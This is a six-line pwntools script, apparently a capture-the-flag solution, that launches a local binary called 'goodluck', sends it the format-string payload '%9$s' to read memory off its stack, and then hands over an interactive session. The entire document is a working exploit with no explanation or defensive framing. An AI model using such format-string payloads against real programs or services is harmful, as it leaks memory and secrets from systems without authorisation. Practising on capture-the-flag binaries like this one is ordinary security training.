from pwn import *
sh = process('./goodluck')
payload = "%9$s"
#gdb.attach(sh)
sh.sendline(payload)
sh.interactive()
